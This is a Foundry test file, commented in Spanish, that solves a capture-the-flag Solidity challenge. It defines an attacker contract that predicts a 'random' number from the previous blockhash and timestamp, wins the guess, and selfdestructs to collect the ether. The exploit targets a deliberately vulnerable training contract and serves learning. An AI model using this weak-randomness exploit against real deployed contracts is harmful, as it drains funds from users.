// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import "../src/04-guess-the-new-number.sol";

// aqui puedes agregar un contrato o hacer otro import
contract Nostradamus {
    // esta funcion nos da el numero 
    function getRandomNumber() public view returns(uint8){
        return uint8(
            uint256(
                keccak256(
                    abi.encodePacked(blockhash(block.number - 1), block.timestamp)
                )
            )
        );
    }
    
    // esta funcion llama a la funcion .guess() y le pasa el numero 
    function attack(GuessTheNewNumberChallenge t) external payable {
        t.guess{value: 1 ether}(getRandomNumber());
        // payable(msg.sender).transfer(address(this).balance);
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {}
}

contract Challenge4Test is Test {
    GuessTheNewNumberChallenge target;
    address player = vm.addr(1);

    function setUp() public {
        target = new GuessTheNewNumberChallenge{value: 1 ether}();
        vm.label(address(target), "Challenge");
        vm.label(player, "Player");
        vm.deal(player, 1 ether);
    }

    function testChallenge() public {
        vm.startPrank(address(player));
        
        // llamamos al contrato del oraculo que creamos llamado Nostradamus
        Nostradamus exploit = new Nostradamus();
        vm.warp(500);
        exploit.attack{value: 1 ether}(target);

        assertTrue(target.isComplete());
    }
}